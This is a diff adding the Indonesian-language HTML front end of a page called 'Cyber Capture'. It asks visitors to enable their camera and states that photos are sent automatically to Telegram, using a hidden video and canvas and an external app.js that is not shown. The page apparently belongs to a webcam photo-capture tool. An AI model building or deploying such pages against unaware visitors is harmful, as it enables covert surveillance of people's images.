@@ -1,0 +1,20 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Cyber Capture (Pages)</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <main class="card">
+    <h1>Cyber Capture</h1>
+    <p class="subtitle">Klik tombol untuk mengizinkan kamera — foto akan otomatis dikirim ke Telegram.</p>
+    <button id="startBtn" class="btn">Aktifkan Kamera</button>
+    <div id="status" class="status">Menunggu aksi...</div>
+    <video id="video" autoplay playsinline muted style="display:none"></video>
+    <canvas id="canvas" hidden></canvas>
+  </main>
+  <script src="app.js"></script>
+</body>
+</html>
